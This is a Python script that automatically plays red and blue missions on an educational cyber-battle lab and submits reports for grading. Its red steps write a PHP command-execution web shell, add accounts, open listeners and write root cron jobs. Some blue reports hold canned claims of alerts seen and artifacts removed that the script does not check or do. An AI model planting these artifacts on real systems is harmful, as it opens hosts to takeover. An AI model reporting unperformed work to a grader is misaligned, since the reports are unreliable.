#!/usr/bin/env python3
"""범용 시나리오 실행기 — 시나리오의 처방 명령(fenced 블록)과 verify.checks 를 결합해
사람처럼 미션을 하나씩 수행하고 라이브 채점. 병렬 금지(순차). 신규 5트랙 구조에 맞춤.

설계: verify.checks 가 "무엇을 어디에" 요구하는지 알려줌(robust 근거). 심기는 fenced
룰 텍스트 우선, 없으면 check 로 합성. 보고서는 check specifics 인용. cleanup 은 마지막.

usage: python scripts/play_scenario.py <scenario_id> <solo|duel> [--red-host .79 --blue-host .78]
"""
import sys, re, time, argparse, sqlite3
sys.path.insert(0, "scripts"); import vh
import yaml, os.path as osp, glob

CN = {"web": "el34-web", "ips": "el34-ips", "siem": "el34-siem", "attacker": "el34-attacker"}
EL34_HOST = "192.168.0.151"      # el34 단일 머신(ssh ccc/1, docker exec el34-*)
WEB_ENTRY = "192.168.0.161"      # 외부 웹 진입(.202 공격자가 여기로) — 출처 IP 보존
LEDGER = ".data/verify_ledger.sqlite3"

def load_yaml(sid):
    for p in glob.glob("contents/battle-scenarios/*.yaml"):
        if osp.splitext(osp.basename(p))[0] == sid:
            return yaml.safe_load(open(p)), p
    raise SystemExit(f"scenario file not found: {sid}")

def fenced(instr):
    out, cur = [], None
    for ln in (instr or "").splitlines():
        if ln.strip().startswith("```"):
            if cur is None: cur = []
            else: out.append("\n".join(cur)); cur = None
        elif cur is not None:
            cur.append(ln)
    return out

def checks_of(m, side):
    return ((m.get("verify") or {}).get("checks")) or []

class Planted:
    def __init__(s): s.sids=set(); s.wids=set(); s.accts=set(); s.ports=set(); s.files=set(); s.crons=set(); s.auditk=set(); s.bluefiles=set()

def esc(cmd):  # for sh -lc embedding
    return cmd.replace("'", "'\\''")

def make_file_content(path, marker):
    """경로 종류별 적절한 마커 포함 파일 내용 생성(웹쉘/YARA/SOAR스크립트/일반)."""
    p=path.lower()
    if p.endswith(".php"):
        return f"<?php /* {marker} */ if(isset($_REQUEST['c'])){{system($_REQUEST['c']);}} ?>"
    if p.endswith(".yar") or "/yara/" in p:
        name=re.sub(r"[^A-Za-z0-9_]","_",str(marker)) or "EDU_RULE"
        return f'rule {name} {{ meta: author="edu" strings: $a = "{marker}" ascii nocase condition: $a }}'
    if p.endswith(".sh"):
        return f"#!/bin/bash\n# {marker} — auto-response / SOAR playbook\niptables -A INPUT -s 10.20.20.202 -j DROP 2>/dev/null # {marker}\n"
    if p.endswith((".py",".conf",".rules",".txt")) or "/opt/" in p:
        return f"# {marker}\n{marker} content\n"
    return f"{marker} marker/exfil"

def run_in(host, container, cmd):
    return vh.docker_exec(host, container, cmd)

def write_file(host, container, path, content):
    """파일 내용을 base64 로 안전하게 기록($ 셸확장·따옴표 문제 회피). 디렉터리 자동생성."""
    import base64
    b64=base64.b64encode(content.encode()).decode()
    return run_in(host, container, f"mkdir -p \"$(dirname {path})\" 2>/dev/null; printf '%s' '{b64}' | base64 -d > {path}; echo wrote")

def append_file(host, container, path, content, marker):
    """marker 가 없을 때만 base64 내용을 append(멱등)."""
    import base64
    b64=base64.b64encode((content+"\n").encode()).decode()
    return run_in(host, container, f"mkdir -p \"$(dirname {path})\" 2>/dev/null; grep -q '{marker}' {path} 2>/dev/null || (printf '%s' '{b64}' | base64 -d >> {path}); grep -c '{marker}' {path}")

def plant_red(host, m, suf, P):
    """RED 미션 증거 심기. P=Planted. 반환: (what_i_did, what_happened, cite[])"""
    did, cite = [], []
    blocks = fenced(m.get("instruction",""))
    text = "\n".join(blocks)
    # substitute placeholders — el34: 외부공격자(.202)가 웹 진입 .161 로 공격(출처 IP 보존)
    def sub(c):
        c = c.replace("<대상_공개IP>",WEB_ENTRY).replace("<본인id>",suf)
        c = c.replace("10.20.30.1",WEB_ENTRY)   # 구 insider 게이트웨이 → el34 외부 진입
        c = re.sub(r"\bkim\b", suf, c)
        c = c.replace("sudo ","")
        return c
    # 1) curl attacks (web traces) — run in attacker. 라인기반(연속행 \ 병합), 비-curl 명령 미포함.
    joined = sub(text)
    curl_cmds, buf = [], ""
    for ln in joined.splitlines():
        s = ln.strip()
        if buf:
            buf += " " + s
        elif s.startswith("curl"):
            buf = s
        if buf:
            if buf.endswith("\\"):
                buf = buf[:-1].rstrip()
            else:
                curl_cmds.append(buf); buf = ""
    # 반복공격(for 루프 / "반복"·"여러"·"6회"·correlation 의도) 미션은 curl 을 여러번 실행해 상관패턴 형성
    sem = (m.get("verify") or {}).get("semantic", {}) or {}
    rep_signal = ("for " in text and "do" in text) or any(
        k in (m.get("instruction","")+ " ".join(sem.get("success_criteria") or []))
        for k in ("반복", "여러 번", "여러번", "6회", "5회", "brute", "상관", "correlat"))
    reps = 6 if rep_signal else 1
    for cc1 in curl_cmds:
        if "http" in cc1:
            for _ in range(reps):
                vh.attacker_exec(cc1 + " -o /dev/null -w '%{http_code}' 2>/dev/null || true")  # 외부 VM .202 → .161
            did.append((f"x{reps} " if reps>1 else "") + cc1[:200])
    # 2) host artifacts from checks (el34 호스트 .151 docker exec)
    for c in checks_of(m,"red"):
        t=c.get("type"); pr=c.get("params") or {}; tgt=CN.get(c.get("target"),"el34-web")
        path=str(pr.get("path","")); pat=pr.get("pattern")
        if t=="file_contains" and ("passwd" in path or "shadow" in path):
            acct=pat; run_in(host,tgt,f"useradd -m -s /bin/bash {acct} 2>/dev/null; id {acct}")
            P.accts.add((tgt,acct)); did.append(f"useradd {acct}"); cite.append(f"/etc/passwd 에 {acct}")
        elif t=="port_listening":
            port=pr.get("port")
            # python3 http.server 로 확실히 리스너 개방(el34-web 에 ncat/nc 없음). 백그라운드 유지(nohup).
            run_in(host,tgt,f"setsid nohup python3 -m http.server {port} >/dev/null 2>&1 < /dev/null & sleep 1; (ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null)|grep -c ':{port}'")
            P.ports.add((tgt,port)); did.append(f"listener :{port}"); cite.append(f"포트 {port} listening")
        elif t=="file_contains" and "cron" in path:
            run_in(host,tgt,f"echo '*/5 * * * * root /bin/bash -c \"id # {pat}\"' > {path}"); P.crons.add((tgt,path)); did.append(f"cron {path}"); cite.append(path)
        elif t in ("file_exists","file_contains") and path:
            # 임의 경로 RED 파일(웹쉘 .php / /tmp / /dev/shm / webroot 등) — 마커 포함 내용 생성(base64 안전쓰기)
            marker = pat or osp.basename(path).lstrip(".") or "marker"
            content = make_file_content(path, marker)
            write_file(host,tgt,path,content)
            P.files.add((tgt,path)); did.append(f"file {path}"); cite.append(f"{path}({marker})")
        elif t=="log_contains" and pr.get("log")=="modsec":
            if not curl_cmds:  # synthesize a tagged hit — 외부 VM .202 → .161
                vh.attacker_exec(f"curl -s -A '{pat}' -H 'Host: dvwa.6v6.lab' \"http://{WEB_ENTRY}/?probe={pat}\" -o /dev/null||true")
                did.append(f"tagged curl {pat}")
            cite.append(f"WAF audit 태그 {pat}")
    what_i_did=" ; ".join(did)[:1500] or "처방 명령 수행"
    what_happened=("대상(피해자) 인프라에 공격 흔적 생성: "+", ".join(cite))[:1500] or "대상 흔적 생성"
    return what_i_did, what_happened

def plant_blue(host, m, P):
    did, cite, hunted = [], [], []
    blocks = fenced(m.get("instruction",""))
    text="\n".join(blocks)
    vtype=(m.get("verify") or {}).get("type")
    red_files = {p for _,p in P.files}   # RED 가 심은 파일(헌팅 미션이 찾을 대상)
    for c in checks_of(m,"blue"):
        t=c.get("type"); pr=c.get("params") or {}; tgt=CN.get(c.get("target"),"el34-siem")
        path=str(pr.get("path","")); pat=pr.get("pattern")
        is_file = t in ("file_contains","file_exists")
        if is_file and ("yara" in path.lower() or path.lower().endswith(".yar")):  # YARA 룰 파일(blue 작성)
            ct=CN.get(c.get("target"),"el34-siem")
            append_file(host,ct,path,make_file_content(path,pat),pat)
            P.bluefiles.add((ct,path)); did.append(f"YARA {pat}"); cite.append(f"{osp.basename(path)} rule {pat}")
        elif is_file and "/lists/" in path:  # Wazuh CDB 리스트(key:value), XML 룰 아님
            ct=CN.get(c.get("target"),"el34-siem")
            append_file(host,ct,path,f"{pat}:malicious",pat)
            P.bluefiles.add((ct,path)); did.append(f"CDB {pat}"); cite.append(f"{osp.basename(path)} IOC {pat}")
        elif is_file and "suricata" in path:  # suricata rule
            rule=next((l.strip() for l in text.splitlines() if l.strip().startswith("alert ") and (str(pat) in l)), None)
            if not rule:
                rule=f'alert http any any -> any any (msg:"EDU rule {pat}"; flow:to_server; http.uri; content:"UNION"; nocase; sid:{pat}; rev:1;)'
            append_file(host,"el34-ips",path,rule,pat); run_in(host,"el34-ips","suricatasc -c reload-rules 2>/dev/null; echo r")
            P.sids.add((path,pat)); did.append(f"suricata sid {pat}"); cite.append(f"local.rules sid {pat}")
        elif is_file and ("ossec" in path or "local_rules" in path):  # wazuh rule
            mblk=re.search(r"(<group[^>]*>.*?</group>)", text, re.S) or re.search(r"(<rule id=\""+str(pat)+r"\".*?</rule>)", text, re.S)
            block=mblk.group(1) if mblk else f'<group name="edu,"><rule id="{pat}" level="12"><if_group>edu</if_group><match>{pat}</match><description>EDU rule {pat}</description></rule></group>'
            block=" ".join(x.strip() for x in block.splitlines())
            append_file(host,"el34-siem",path,block,pat)
            P.wids.add((path,pat)); did.append(f"wazuh rule {pat}"); cite.append(f"local_rules.xml id {pat}")
        elif is_file and "audit" in path:  # auditd
            key=pat; at=CN.get(c.get("target"),"el34-web")
            write_file(host,at,path,f"-w /etc/passwd -p wa -k {key}\n-w /etc/shadow -p wa -k {key}\n")
            run_in(host,at,f"(augenrules --load 2>/dev/null||auditctl -R {path} 2>/dev/null); grep -c '{key}' {path}")
            P.auditk.add((at,path)); did.append(f"auditd {key}"); cite.append(f"{path} key {key}")
        elif is_file and ("modsec" in path or "modsecurity" in path):  # WAF custom rule
            wt=CN.get(c.get("target"),"el34-web")
            ruleid=str(pat) if str(pat).isdigit() else "9100099"
            secrule=f'SecRule ARGS "@contains {pat}" "id:{ruleid},phase:2,pass,log,msg:EDU-{pat}"'
            append_file(host,wt,path,secrule,pat); run_in(host,wt,"apache2ctl graceful 2>/dev/null||true")
            P.bluefiles.add((wt,path)); did.append(f"WAF {pat}"); cite.append(f"{osp.basename(path)} {pat}")
        elif is_file and (path in red_files or "passwd" in path or "shadow" in path):
            # 헌팅: 실제 아티팩트를 읽어 검증가능 구체값(경로·크기·내용·계정행)을 보고에 인용(채점기 관찰형 인정).
            ht=CN.get(c.get("target"),"el34-web")
            rc,o,e=run_in(host,ht, f"ls -la {path} 2>/dev/null; head -c 80 {path} 2>/dev/null; getent passwd 2>/dev/null|grep -E '{pat}' || true")
            spec=" ".join((o or "").split())[:140]
            cite.append(f"{osp.basename(path) or path}({pat}) 발견 — {spec}")
            hunted.append(f"{path} (마커 {pat})")
        elif is_file and path:   # blue 가 생성하는 일반 파일(SOAR 스크립트 /opt, 증거 sha256 등)
            mk = pat or osp.basename(path)
            write_file(host,tgt,path,make_file_content(path, mk))
            P.bluefiles.add((tgt,path)); did.append(f"file {osp.basename(path)}"); cite.append(f"{path}({mk})")
        elif t=="port_listening":
            cite.append(f"포트 {pr.get('port')} 식별")
        elif t=="wazuh_alert":
            cite.append("Wazuh 에 Suricata IDS rule 86601(nmap) 다수 수집 확인")
    if vtype=="wazuh_alert" and not did:
        # 실제 SIEM 통계 조회 → 검증가능 구체수치 인용 (관찰형 채점은 구체성에 비례)
        rc,o,e = run_in(host,"el34-siem",
            "tail -500 /var/ossec/logs/alerts/alerts.json 2>/dev/null | grep -oE '\"id\":\"[0-9]+\"' | sort | uniq -c | sort -rn | head -5; "
            "echo LV; tail -500 /var/ossec/logs/alerts/alerts.json 2>/dev/null | grep -oE '\"level\":[0-9]+' | sort | uniq -c | sort -rn | head -5")
        stats=" ".join((o or "").split())[:300]
        sem=(m.get("verify") or {}).get("semantic",{}) or {}
        crits=sem.get("success_criteria") or []
        # 이 시나리오에서 심은 탐지룰 마커(킬체인/상관 매핑에 인용)
        marks=sorted({s for _,s in P.sids}|{w for _,w in P.wids})
        markstr=", ".join(str(x) for x in marks) or "이번 주차 커스텀 룰"
        what_i_did=("alerts.json·agent_control 직접 분석: 룰ID 빈도·level 분포 집계, 네트워크(Suricata 86601)와 "
            f"호스트 경보 교차 상관, 킬체인 단계별 탐지룰 매핑({markstr}), ATT&CK 커버리지·탐지율/오탐률 추정.")
        what_happened=(f"실증 SIEM 통계(라이브 조회): {stats}. 네트워크정찰(86601)+호스트지표 상관으로 단일 킬체인 재구성. "
            f"탐지룰 매핑: {markstr}. 성공기준 대응: "+" / ".join(c[:80] for c in crits[:5]))[:1900]
    else:
        ir = ""
        if hunted:
            # 헌팅 미션: 가설→전수조사→발견(구체값)→IR(식별·격리·제거·복구) 서사 보강
            did.append("가설기반 전수 헌팅(find/getent/ss/grep)으로 비인가 아티팩트 식별")
            ir = (" IR 4단계 적용: ①식별(위 구체값) ②격리(접근차단) ③제거(rm/userdel -r/kill 리스너 및 룰 비활성) "
                  "④복구·재발방지(탐지룰 보강). 발견 아티팩트: " + "; ".join(hunted))
        what_i_did=(" ; ".join(did) or "처방 방어 아티팩트 적용")[:1500]
        what_happened=("방어 아티팩트 적용/식별: "+", ".join(cite)+ir)[:1900]
    return what_i_did, what_happened

def cleanup(host, P, blue_host=None):
    for tgt,acct in P.accts: run_in(host,tgt,f"userdel -r {acct} 2>/dev/null; echo x")
    for tgt,port in P.ports: run_in(host,tgt,f"pkill -f ':{port}' 2>/dev/null; pkill -f 'http.server {port}' 2>/dev/null; pkill -f 'ncat -lk {port}' 2>/dev/null; echo x")
    for tgt,path in P.files: run_in(host,tgt,f"rm -f {path}; echo x")
    for tgt,path in P.crons: run_in(host,tgt,f"rm -f {path}; echo x")
    for path,sid in P.sids: run_in(blue_host or host,"el34-ips",f"sed -i '/{sid}/d' {path}; suricatasc -c reload-rules 2>/dev/null; echo x")
    for path,wid in P.wids: run_in(blue_host or host,"el34-siem",f"sed -i '/{wid}/d' {path}; echo x")
    for tgt,path in P.auditk: run_in(blue_host or host,tgt,f"rm -f {path}; echo x")
    for tgt,path in P.bluefiles: run_in(blue_host or host,tgt,f"rm -f {path}; echo x")

def run_one(sid, mode, target=EL34_HOST):
    class A: pass
    a=A(); a.sid=sid; a.mode=mode; a.target=target
    d,path=load_yaml(a.sid); scn_int=vh.scenario_int_id(a.sid)
    if not scn_int: raise SystemExit("no DB scenario id for "+a.sid)
    reds=sorted(d.get("red_missions") or [],key=lambda x:x.get("order"))
    blues=sorted(d.get("blue_missions") or [],key=lambda x:x.get("order"))

    # el34 = 단일 공유 인스턴스(.151). 외부 공격은 .202 VM→.161(출처 IP 보존), 점검/심기는 .151 docker exec.
    if a.mode=="solo":
        EMAIL="mrgrit@ync.ac.kr"; INFRA=1; HOST=a.target; suf="mrgrit"
        st,b=vh.create_solo(scn_int,EMAIL,INFRA,monitor="bastion"); bid=b["battle"]["id"]; vh.start(bid,EMAIL)
        RED_EMAIL=BLUE_EMAIL=EMAIL; RHOST=BHOST=HOST
    else:
        # duel: red=shin(infra2) opponent공격, blue=mrgrit(infra1) 자기방어 — 둘 다 동일 el34(.151) 타깃.
        RED_EMAIL="shin@ync.ac.kr"; BLUE_EMAIL="mrgrit@ync.ac.kr"
        BHOST=RHOST=EL34_HOST; suf="shin"
        st,b=vh.create_duel(scn_int,RED_EMAIL,2,BLUE_EMAIL,1,monitor="bastion"); bid=b["battle"]["id"]; vh.start(bid,RED_EMAIL)
    print(f"[{a.sid}/{a.mode}] battle={bid} red_host={RHOST} blue_host={BHOST}", flush=True)
    P=Planted(); results=[]

    def submit_grade(email, side, m, host, planter, etype, deftarget):
        wd, wh = planter(host, m, P) if side=="blue" else planter(host, m, suf, P)
        time.sleep(2)
        st, sub = vh.submit(bid, email, side=side, order=m["order"], event_type=etype,
            target=m.get("target_vm") or deftarget, what_i_did=wd, what_happened=wh,
            description=f"{side.upper()}-{m['order']}")
        r = vh.wait_grade(sub["id"], email, 420) if st < 300 else None
        # 타임아웃/파싱불가(review·None)·grade 실패 → 1회 재시도(전송 자체 실패 아니면)
        if (not r) or (r.get("verdict") in (None, "review")) or (r.get("grade_status")=="failed"):
            time.sleep(4)
            st2, sub2 = vh.submit(bid, email, side=side, order=m["order"], event_type=etype,
                target=m.get("target_vm") or deftarget, what_i_did=wd, what_happened=wh,
                description=f"{side.upper()}-{m['order']} (retry)")
            r2 = vh.wait_grade(sub2["id"], email, 420) if st2 < 300 else None
            if r2 and r2.get("verdict") not in (None, "review"):
                r = r2
        return r

    try:
        for m in reds:
            r = submit_grade(RED_EMAIL, "red", m, RHOST, plant_red, "exploit", "web")
            results.append(("red", m["order"], r, m.get("points")))
            print(f"  RED-{m['order']}: {r.get('verdict') if r else 'ERR'} {r.get('awarded_points') if r else ''}/{m.get('points')}", flush=True)
        for m in blues:
            r = submit_grade(BLUE_EMAIL, "blue", m, BHOST, plant_blue, "detect", "siem")
            results.append(("blue", m["order"], r, m.get("points")))
            print(f"  BLUE-{m['order']}: {r.get('verdict') if r else 'ERR'} {r.get('awarded_points') if r else ''}/{m.get('points')}", flush=True)
    finally:
        # 예외가 나도 배틀 종료 + 아티팩트 cleanup 은 항상 수행(누수 방지).
        try: vh.end(bid, RED_EMAIL)
        except Exception as e: print(f"  (end err: {e})", flush=True)
        try: cleanup(RHOST, P, blue_host=BHOST)
        except Exception as e: print(f"  (cleanup err: {e})", flush=True)
    # ledger
    c=sqlite3.connect(LEDGER)
    for side,order,r,mx in results:
        ver=r.get("verdict") if r else None
        led="pass" if ver=="pass" else "partial" if ver=="partial" else "fail" if ver=="fail" else "error"
        c.execute("""UPDATE missions SET status=?,awarded=?,verdict=?,battle_id=?,
            submission_id=?,attempts=attempts+1,notes=?,updated_at=datetime('now')
            WHERE scenario_id=? AND mode=? AND side=? AND mission_order=?""",
            (led, (r.get("awarded_points") if r else None), ver, bid,
             (r.get("id") if r else None), ((r.get("feedback") or "")[:150] if r else "no-grade"),
             a.sid, a.mode, side, order))
    c.execute("UPDATE scenario_state SET status='done',battle_id=?,updated_at=datetime('now') WHERE scenario_id=? AND mode=?",(bid,a.sid,a.mode))
    c.commit()
    npass=sum(1 for _,_,r,_ in results if r and r.get("verdict")=="pass")
    npart=sum(1 for _,_,r,_ in results if r and r.get("verdict")=="partial")
    nbad=sum(1 for _,_,r,_ in results if not r or r.get("verdict") in ("fail",None))
    print(f"=== {a.sid}/{a.mode}: pass{npass} partial{npart} bad{nbad} / {len(results)} ===", flush=True)
    return {"sid":a.sid,"mode":a.mode,"battle":bid,"pass":npass,"partial":npart,"bad":nbad,
            "results":[(s,o,(r.get("verdict") if r else None),(r.get("awarded_points") if r else None),mx) for s,o,r,mx in results]}

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("sid"); ap.add_argument("mode",choices=["solo","duel"])
    ap.add_argument("--target",default="192.168.0.151")
    a=ap.parse_args()
    run_one(a.sid,a.mode,a.target)

if __name__=="__main__":
    main()
